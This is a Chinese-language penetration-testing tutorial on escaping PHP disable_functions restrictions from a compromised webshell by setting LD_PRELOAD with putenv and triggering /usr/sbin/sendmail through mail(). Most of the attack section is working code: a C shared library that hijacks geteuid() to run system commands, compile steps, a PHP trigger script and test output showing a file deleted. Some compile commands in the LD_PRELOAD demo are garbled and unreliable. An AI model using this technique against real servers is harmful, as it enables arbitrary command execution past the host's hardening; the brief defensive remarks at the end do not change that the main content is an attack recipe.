# 利用环境变量LD_PRELOAD来绕过php disable_function执行系统命令

0x00 前言
=======

* * *

在做渗透测试的时候如果遇到安全配置比较好的服务器，当你通过各种途径获得一个php类型的webshell后，却发现面对的是无法执行系统命令的尴尬，因为这类服务器针对命令执行函数做了防范措施，后续的渗透行为都因此而止步。笔者这里分享一个绕过思路，希望你能在实际测试中派上用场。

0x02 绕过思路
=========

* * *

严苛环境下php设置的disable_function如下：

*   dl
*   exec
*   system
*   passthru
*   popen
*   proc_open
*   pcntl_exec
*   shell_exec

如果你遇到的设置中漏掉某些函数，那再好不过了，直接利用漏掉的函数绕过。但如果运气不太好，遇到这种所有能直接执行系统命令的函数都被禁用的情况，那真是欲哭无泪。想反弹一个cmdshell变成奢望。当然考虑到开发使用等影响因素，一般web环境不应完全禁用。

笔者经过大量资料搜寻，发现在这种情况下还有几种执行系统命令的方法，例如通过/proc/self/mem 修改got来劫持库函数调用以及php反序列化内存破坏漏洞利用，但这些方法利用起来难度都较大，你得先搞清楚内存偏移地址等等知识点，并搭建相同的平台进行调试。而且一般来说安全配置还会严格限制用户的文件权限并设置open_basedir，你根本没有机会去读取mem等文件，很难利用成功。

那么还有没有别的方法？putenv和mail函数给了我们希望，如果系统没有修补bash漏洞，利用网上已经给出的poc：[http://www.exploit-db.com/exploits/35146/](http://www.exploit-db.com/exploits/35146/)可以轻松绕过。

这个poc大体思路是通过putenv来设置一个包含自定义函数的环境变量，通过mail函数来触发。为什么mail函数能触发，因为mail函数在执行过程中，php与系统命令执行函数有了交集，它调用了popen函数来执行，如果系统有bash漏洞，就直接触发了恶意代码的执行。但一般这种漏洞，安全意识好一点的运维，都会给打上补丁了。

那么我们来继续挖掘一下它的思路，php的mail函数在执行过程中会默认调用系统程序/usr/sbin/sendmail，如果我们能劫持sendmail程序，再用mail函数来触发就能实现我们的目的了。那么我们有没有办法在webshell层来劫持它呢，环境变量LD_PRELOAD给我们提供了一种简单实用的途径。

0x03 LD_PRELOAD hack
====================

* * *

在UNIX的动态链接库的世界中，LD_PRELOAD是一个有趣的环境变量，它可以影响程序运行时的链接，它允许你定义在程序运行前优先加载的动态链接库。如果你想进一步了解这些知识，可以去网上搜索相关文章，这里不做过多解释，直接来看一段例程，就能明白利用原理。

例程：verifypasswd.c

```
#include <stdio.h>
#include <string.h>
int main(int argc, char **argv){
char passwd[] = "password";
if (argc < 2) {
        printf("usage: %s <password>/n", argv[0]);
        return;
}
if (!strcmp(passwd, argv[1])) {
        printf("Correct Password!/n");
        return;
}
printf("Invalid Password!/n");
}

```

程序很简单，根据判断传入的字符串是否等于"password"，得出两种不同结果。 其中用到了标准C函数strcmp函数来做比较，这是一个外部调用函数，我们来重新编写一个同名函数：

```
#include <stdio.h>
#include <string.h>
int strcmp(const char *s1, const char *s2){
    printf("hack function invoked. s1=<%s> s2=<%s>/n", s1, s2);
    return 0;
}

```

把它编译为一个动态共享库：

```
$ gcc -o verifypasswd.c verifypasswd    

$ gcc -shared verifypasswd -o hack.so

```

通过LD_PRELOAD来设置它能被其他调用它的程序优先加载：

```
$ export LD_PRELOAD="./hack.so"

```

运行给出的例程：

```
$ ./verifypasswd  abcd  

$ Correct Password!

```

我们看到随意输入字符串都会显示密码正确，这说明程序在运行时优先加载了我们自己编写的程序。这也就是说如果程序在运行过程中调用了某个标准的动态链接库的函数，那么我们就有机会通过LD_PRELOAD来设置它优先加载我们自己编写的程序，实现劫持。

0x04 实战测试
=========

* * *

那么我们来看一下sendmail函数都调用了哪些库函数，使用`readelf -Ws /usr/sbin/sendmail`命令来查看，我们发现sendmail函数在运行过程动态调用了很多标准库函数：

```
[yiyang@bogon Desktop]$ readelf -Ws /usr/sbin/sendmail  

Symbol table '.dynsym' contains 202 entries:
   Num:    Value          Size Type    Bind   Vis      Ndx Name
     0: 0000000000000000     0 NOTYPE  LOCAL  DEFAULT  UND 
     1: 0000000000000238     0 SECTION LOCAL  DEFAULT    1 
     2: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND getegid@GLIBC_2.2.5 (2)
     3: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND __errno_location@GLIBC_2.2.5 (2)
     4: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND pcre_fullinfo
     5: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND tzset@GLIBC_2.2.5 (2)
     6: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND strcspn@GLIBC_2.2.5 (2)
     7: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND __ctype_toupper_loc@GLIBC_2.3 (3)
     8: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND __ctype_tolower_loc@GLIBC_2.3 (3)
     9: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND getopt@GLIBC_2.2.5 (2)
    10: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND socket@GLIBC_2.2.5 (2)
    11: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND fork@GLIBC_2.2.5 (2)
    12: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND db_version
    13: 0000000000000000     0 OBJECT  GLOBAL DEFAULT  UND __environ@GLIBC_2.2.5 (2)
    14: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND strerror@GLIBC_2.2.5 (2)
    15: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND write@GLIBC_2.2.5 (2)
    16: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND strchr@GLIBC_2.2.5 (2)
    17: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND seteuid@GLIBC_2.2.5 (2)
    18: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND strspn@GLIBC_2.2.5 (2)
    19: 0000000000000000     0 FUNC    WEAK   DEFAULT  UND __cxa_finalize@GLIBC_2.2.5 (2)
    20: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND strlen@GLIBC_2.2.5 (2)
......

```

从中选取一个合适的库函数后我们就可以进行测试了：

1.  编制我们自己的动态链接程序。
2.  通过putenv来设置LD_PRELOAD，让我们的程序优先被调用。
3.  在webshell上用mail函数发送一封邮件来触发。

我们来测试删除一个新建的文件，这里我们选取geteuid()函数来改造，先在/tmp目录新建一个文件check.txt。

编写hack.c：

```
#include <stdlib.h>
#include <stdio.h>
#include <string.h> 

void payload() {
        system("rm /tmp/check.txt");
}   

int  geteuid() {
if (getenv("LD_PRELOAD") == NULL) { return 0; }
unsetenv("LD_PRELOAD");
payload();
}

```

当这个共享库中的geteuid被调用时，尝试加载payload()函数，执行命令。这个测试函数写的很简单，实际应用时可相应调整完善。在攻击机上（注意编译平台应和靶机平台相近，至少不能一个是32位一个是64位）把它编译为一个位置信息无关的动态共享库：

```
$ gcc -c -fPIC hack.c -o hack 

$ gcc -shared hack -o hack.so

```

再上传到webshell上，然后写一段简单的php代码：

```
<?php
putenv("LD_PRELOAD=/var/www/hack.so");
mail("a@localhost","","","","");
?>

```

在浏览器中打开就可以执行它，然后再去检查新建的文件是否还存在，找不到文件则表示系统成功执行了删除命令，也就意味着绕过成功，测试中注意修改为实际路径。 本地测试效果如下：

```
[yiyang@bogon Desktop]$ touch /tmp/check.txt
[yiyang@bogon bin]$ ./php mail.php
sendmail: warning: the Postfix sendmail command has set-uid root file permissions
sendmail: warning: or the command is run from a set-uid root process
sendmail: warning: the Postfix sendmail command must be installed without set-uid root file permissions
sendmail: fatal: setgroups(1, &500): Operation not permitted
[yiyang@bogon bin]$ cat /tmp/check.txt
cat: /tmp/check.txt: No such file or directory

```

普通用户权限，目标文件被删除。

0x05 小结
=======

* * *

以上方法在Linux RHEL6及自带邮件服务+php5.3.X以下平台测试通过，精力有限未继续在其他平台测试，新版本可能进行了相应修复。这种绕过行为其实也很容易防御，禁用相关函数或者限制环境变量的传递，例如安全模式下，这种传递是不会成功的。这个思路不仅仅局限于mail函数，你可以尝试追踪其他函数的调用过程，例如syslog等与系统层有交集的函数是否也有类似调用动态共享库的行为来举一反三。